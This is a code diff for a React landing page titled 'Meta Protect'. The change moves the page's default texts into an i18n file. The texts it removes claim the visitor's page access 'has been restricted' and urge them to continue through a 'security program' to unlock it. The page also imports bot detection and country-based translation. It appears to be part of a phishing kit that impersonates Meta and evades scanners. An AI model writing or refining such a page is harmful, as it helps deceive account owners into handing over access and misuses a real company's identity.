@@ -6,6 +6,7 @@ import HeroImage from '@/assets/images/hero-image.jpg';
 import '@/assets/css/meta-protect-landing.css';
 import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import { landingDefaultTexts } from '@/i18n/default-texts';
 import { translateTexts } from '@/utils/translate-by-lang';
 import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
@@ -126,18 +127,7 @@ const LandingPage = ({ onContinue }: LandingPageProps) => {
     const [today, setToday] = useState('');
     const [translatedTexts, setTranslatedTexts] = useState<Record<string, string>>({});
 
-    const defaultTexts = useMemo(
-        () => ({
-            title: 'Welcome to Meta Protect.',
-            description:
-                "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
-            protectionText: "We've enabled advanced protections to unblock your Page.",
-            processText: 'We will guide you through the process in detail and help you fully activate to unlock your Page.',
-            restrictedText: 'Access to your page has been restricted on',
-            continueBtn: 'Continue'
-        }),
-        []
-    );
+    const defaultTexts = useMemo(() => ({ ...landingDefaultTexts }), []);
 
     const translateAllTexts = useCallback(
         async (lang: string) => {
